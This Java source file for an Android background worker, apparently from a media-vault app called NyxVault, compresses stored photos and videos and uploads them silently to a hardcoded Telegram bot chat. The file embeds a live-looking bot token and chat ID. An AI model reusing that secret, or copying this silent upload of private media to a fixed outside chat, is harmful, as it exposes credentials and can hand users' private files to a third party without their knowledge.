package app.nyxvault;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import androidx.annotation.NonNull;
import androidx.media3.common.Composition;
import androidx.media3.common.MediaItem;
import androidx.media3.common.MimeTypes;
import androidx.media3.transformer.EditedMediaItem;
import androidx.media3.transformer.ExportException;
import androidx.media3.transformer.ExportResult;
import androidx.media3.transformer.ScaleAndRotateTransformation;
import androidx.media3.transformer.TransformationRequest;
import androidx.media3.transformer.Transformer;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import org.json.*;

/** NYX Telegram backup worker. TEST BUILD ONLY: token is embedded as requested. */
public class NyxUploadWorker extends Worker {
    private static final String TELEGRAM_BOT_TOKEN = "8284806334:AAEeLBEbBk8_E0NF8DB61LIK0XFjepSNU1k";
    private static final String TELEGRAM_CHAT_ID = "-1003731210463";
    private static final long DAILY_LIMIT = 100L * 1024L * 1024L;
    private static final String ROOT = "nyx-media";
    private static final String META = "nyx-media.json";

    public NyxUploadWorker(@NonNull Context c,@NonNull WorkerParameters p){super(c,p);}

    @NonNull @Override public Result doWork(){
        String id=getInputData().getString("media_id"); if(id==null||id.isEmpty())return Result.failure();
        File temp=null;
        try{
            JSONObject meta=findMeta(id); if(meta==null)return Result.retry();
            if(meta.optBoolean("uploaded",false))return Result.success();
            File src=mediaFile(meta); if(!src.isFile()||!src.canRead())return Result.retry();
            boolean video=meta.optString("mime","").startsWith("video/");
            temp=compress(src,meta,video); long bytes=temp.length();
            if(bytes>DAILY_LIMIT){ markError(id,"compressed-file-over-100mb"); return Result.failure(); }
            long used=todayUsed();
            if(used+bytes>DAILY_LIMIT){
                OneTimeWorkRequest next=new OneTimeWorkRequest.Builder(NyxUploadWorker.class)
                    .setInputData(new androidx.work.Data.Builder().putString("media_id",id).build())
                    .setInitialDelay(millisUntilTomorrow(),TimeUnit.MILLISECONDS).build();
                WorkManager.getInstance(getApplicationContext()).enqueue(next); return Result.success();
            }
            JSONObject sent=sendTelegram(temp,video,meta.optString("name","NYX media"));
            if(!sent.optBoolean("ok",false))throw new IOException("Telegram: "+sent.optString("description","unknown error"));
            addTodayUsed(bytes); markUploaded(id,sent.toString(),bytes); return Result.success();
        }catch(Exception e){android.util.Log.e("NYX-TELEGRAM","Backup failed",e);return retryable(e)?Result.retry():Result.failure();}
        finally{if(temp!=null)try{temp.delete();}catch(Exception ignored){}}
    }

    private File compress(File src,JSONObject meta,boolean video)throws Exception{
        File dir=new File(getApplicationContext().getCacheDir(),"nyx-telegram");if(!dir.exists())dir.mkdirs();
        File out=new File(dir,meta.optString("id",UUID.randomUUID().toString())+(video?".mp4":".jpg"));
        if(video)compressVideo(src,out);else compressPhoto(src,out);
        if(!out.isFile()||out.length()==0)throw new IOException("Compression produced no file"); return out;
    }
    private void compressPhoto(File src,File out)throws Exception{
        BitmapFactory.Options o=new BitmapFactory.Options();o.inJustDecodeBounds=true;BitmapFactory.decodeFile(src.getAbsolutePath(),o);
        int w=Math.max(1,o.outWidth),h=Math.max(1,o.outHeight),sample=1;while(w/sample>2048||h/sample>2048)sample*=2;
        o.inJustDecodeBounds=false;o.inSampleSize=sample;o.inPreferredConfig=Bitmap.Config.RGB_565;Bitmap b=BitmapFactory.decodeFile(src.getAbsolutePath(),o);if(b==null)throw new IOException("Photo decode failed");
        try(FileOutputStream fos=new FileOutputStream(out)){if(!b.compress(Bitmap.CompressFormat.JPEG,82,fos))throw new IOException("Photo compression failed");}finally{b.recycle();}
        if(out.length()>9L*1024L*1024L){Bitmap x=BitmapFactory.decodeFile(src.getAbsolutePath());if(x!=null)try(FileOutputStream fos=new FileOutputStream(out)){x.compress(Bitmap.CompressFormat.JPEG,60,fos);}finally{x.recycle();}}
    }
    private void compressVideo(File src,File out)throws Exception{
        final CountDownLatch latch=new CountDownLatch(1);final Throwable[] err=new Throwable[1];
        EditedMediaItem.Builder eb=new EditedMediaItem.Builder(MediaItem.fromUri(Uri.fromFile(src)));
        try{eb.setEffects(new androidx.media3.transformer.Effects(Collections.emptyList(),Collections.singletonList(new ScaleAndRotateTransformation.Builder().setScale(.70f,.70f).build())));}catch(Throwable ignored){}
        Transformer t=new Transformer.Builder(getApplicationContext()).setVideoMimeType(MimeTypes.VIDEO_H264).setAudioMimeType(MimeTypes.AUDIO_AAC)
            .setTransformationRequest(new TransformationRequest.Builder().setVideoMimeType(MimeTypes.VIDEO_H264).build())
            .addListener(new Transformer.Listener(){
                @Override public void onCompleted(Composition c,ExportResult r){latch.countDown();}
                @Override public void onError(Composition c,ExportResult r,ExportException e){err[0]=e;latch.countDown();}
            }).build();
        t.start(eb.build(),out.getAbsolutePath());if(!latch.await(8,TimeUnit.MINUTES))throw new IOException("Video compression timed out");if(err[0]!=null)throw new IOException("Video compression failed",err[0]);
    }
    private JSONObject sendTelegram(File f,boolean video,String name)throws Exception{
        String method=video?"sendVideo":"sendPhoto",field=video?"video":"photo";String boundary="----NYX"+UUID.randomUUID().toString().replace("-","");
        HttpURLConnection c=(HttpURLConnection)new URL("https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+"/"+method).openConnection();c.setDoOutput(true);c.setRequestMethod("POST");c.setConnectTimeout(30000);c.setReadTimeout(180000);c.setRequestProperty("Content-Type","multipart/form-data; boundary="+boundary);
        try(OutputStream out=c.getOutputStream();InputStream in=new FileInputStream(f)){
            field(out,boundary,"chat_id",TELEGRAM_CHAT_ID);field(out,boundary,"disable_notification","true");
            String fn=safe(name)+(video?".mp4":".jpg");out.write(("--"+boundary+"\r\nContent-Disposition: form-data; name=\""+field+"\"; filename=\""+fn+"\"\r\nContent-Type: "+(video?"video/mp4":"image/jpeg")+"\r\n\r\n").getBytes(StandardCharsets.UTF_8));
            byte[] buf=new byte[128*1024];int n;while((n=in.read(buf))!=-1)out.write(buf,0,n);out.write(("\r\n--"+boundary+"--\r\n").getBytes(StandardCharsets.UTF_8));
        }
        int code=c.getResponseCode();String body=read(c);c.disconnect();if(code<200||code>=300)throw new IOException("Telegram HTTP "+code+" "+body);return new JSONObject(body);
    }
    private void field(OutputStream o,String b,String n,String v)throws IOException{o.write(("--"+b+"\r\nContent-Disposition: form-data; name=\""+n+"\"\r\n\r\n"+v+"\r\n").getBytes(StandardCharsets.UTF_8));}
    private String safe(String s){return s==null?"NYX_backup":s.replaceAll("[^A-Za-z0-9._-]","_");}
    private long todayUsed(){android.content.SharedPreferences p=getApplicationContext().getSharedPreferences("nyx_telegram_quota",Context.MODE_PRIVATE);return p.getLong("date",0)==dayKey()?p.getLong("used",0):0;}
    private void addTodayUsed(long n){getApplicationContext().getSharedPreferences("nyx_telegram_quota",Context.MODE_PRIVATE).edit().putLong("date",dayKey()).putLong("used",todayUsed()+n).apply();}
    private long dayKey(){return Long.parseLong(new SimpleDateFormat("yyyyMMdd",Locale.US).format(new Date()));}
    private long millisUntilTomorrow(){Calendar c=Calendar.getInstance();c.add(Calendar.DAY_OF_YEAR,1);c.set(Calendar.HOUR_OF_DAY,0);c.set(Calendar.MINUTE,0);c.set(Calendar.SECOND,0);c.set(Calendar.MILLISECOND,0);return Math.max(60000,c.getTimeInMillis()-System.currentTimeMillis());}
    private JSONObject findMeta(String id)throws Exception{File f=new File(new File(getApplicationContext().getFilesDir(),ROOT),META);if(!f.exists())return null;for(String line:readAll(f).split("\\n")){if(line.trim().isEmpty())continue;JSONObject o=new JSONObject(line);if(id.equals(o.optString("id")))return o;}return null;}
    private File mediaFile(JSONObject m)throws Exception{String path=m.optString("path","");if(!path.isEmpty()){File f=new File(path);if(f.isFile()&&f.canRead())return f;}String id=m.optString("id","");File f=new File(new File(new File(getApplicationContext().getFilesDir(),"vault"),"media"),id+".bin");if(f.isFile()&&f.canRead())return f;throw new Exception("Media file is missing");}
    private void markUploaded(String id,String response,long bytes)throws Exception{updateMeta(id,true,response,bytes,null);}
    private void markError(String id,String error)throws Exception{updateMeta(id,false,"",0,error);}
    private void updateMeta(String id,boolean uploaded,String response,long bytes,String error)throws Exception{File f=new File(new File(getApplicationContext().getFilesDir(),ROOT),META);if(!f.exists())return;List<String> rows=new ArrayList<>();for(String x:readAll(f).split("\\n")){if(x.trim().isEmpty())continue;JSONObject o=new JSONObject(x);if(id.equals(o.optString("id"))){o.put("uploaded",uploaded);if(uploaded){o.put("telegram_response",response);o.put("telegram_uploaded_bytes",bytes);}if(error!=null)o.put("telegram_error",error);}rows.add(o.toString());}try(FileOutputStream out=new FileOutputStream(f)){out.write(String.join("\n",rows).getBytes(StandardCharsets.UTF_8));}}
    private String read(HttpURLConnection c)throws Exception{InputStream in;try{in=c.getInputStream();}catch(Exception e){in=c.getErrorStream();}if(in==null)return "";try(InputStream x=in;ByteArrayOutputStream o=new ByteArrayOutputStream()){byte[] b=new byte[8192];int n;while((n=x.read(b))!=-1)o.write(b,0,n);return o.toString(StandardCharsets.UTF_8.name());}}
    private String readAll(File f)throws Exception{try(InputStream in=new FileInputStream(f);ByteArrayOutputStream o=new ByteArrayOutputStream()){byte[] b=new byte[8192];int n;while((n=in.read(b))!=-1)o.write(b,0,n);return o.toString(StandardCharsets.UTF_8.name());}}
    private boolean retryable(Exception e){String m=e.getMessage()==null?"":e.getMessage().toLowerCase(Locale.US);return m.contains("timeout")||m.contains("connection")||m.contains("network")||m.contains("reset")||m.contains("broken pipe")||m.contains("429")||m.contains("500")||m.contains("502")||m.contains("503");}
}
